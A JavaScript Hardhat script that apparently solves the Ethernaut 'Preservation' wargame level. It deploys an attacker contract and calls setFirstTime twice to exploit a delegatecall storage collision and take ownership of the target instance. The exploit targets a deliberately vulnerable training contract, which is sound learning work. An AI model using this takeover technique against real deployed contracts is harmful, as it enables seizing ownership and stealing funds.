const {BLOCK_EXPLORER_URL, PRESERVATION_INSTANCE_ADDRESS} = require('./utils');

async function main() {
    console.log('\x1b[33m%s\x1b[0m', '* * * * * * * * * * * * * * * ');
    console.log('Preservation level');

    if (!PRESERVATION_INSTANCE_ADDRESS) {
        console.log('Preservation instance address not found');
        return;
    }

    console.log('Preservation instance address', PRESERVATION_INSTANCE_ADDRESS);

    const [attacker] = await ethers.getSigners();
    const factory = await ethers.getContractFactory("Preservation");
    const contract = factory.attach(PRESERVATION_INSTANCE_ADDRESS);

    const attackerFactory = await ethers.getContractFactory("PreservationAttacker");
    const attackerContract = await attackerFactory.deploy();
    await attackerContract.deployed();

    let tx
    tx = await contract.setFirstTime(attackerContract.address);
    console.log(`Transaction hash : ${BLOCK_EXPLORER_URL}/${tx.hash}`);
    await tx.wait(1);

    tx = await contract.setFirstTime(attacker.address);
    console.log(`Transaction hash : ${BLOCK_EXPLORER_URL}/${tx.hash}`);
    await tx.wait(1);

    console.log('\x1b[32m%s\x1b[0m', 'Preservation level. Done !!!');
    console.log('\x1b[33m%s\x1b[0m', '* * * * * * * * * * * * * * * ');
}

module.exports = main;
